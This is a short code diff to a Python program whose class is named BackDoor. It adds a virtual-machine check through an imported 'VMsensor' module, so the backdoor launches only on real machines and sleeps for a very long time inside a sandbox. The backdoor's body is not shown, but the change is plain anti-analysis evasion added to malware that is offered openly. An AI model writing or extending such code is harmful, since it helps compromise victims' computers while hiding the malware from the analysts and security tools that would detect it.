@@ -11,6 +11,8 @@ import threading
 import subprocess
 import socket
 import datatime
+import time
+from VMsensor import TestVM
 
 #Coded by B3mB4m
 #b3mb4m@gmail.com
@@ -60,5 +62,9 @@ class BackDoor(object):
 		threading.Thread(target=self.bc).start()#(4) Start bc  -------\\\ That functions 
 		threading.Thread(target=self.forceclose).start() #Force close--//	will be working some time ..
 	
-
-BackDoor().run()   #RUN RUN RUN RUN !!
+    
+if TestVM().checkVirtualMachine() != True:
+	BackDoor().run() 
+else:
+	time.sleep(9999999) 
+  #RUN RUN RUN RUN !!
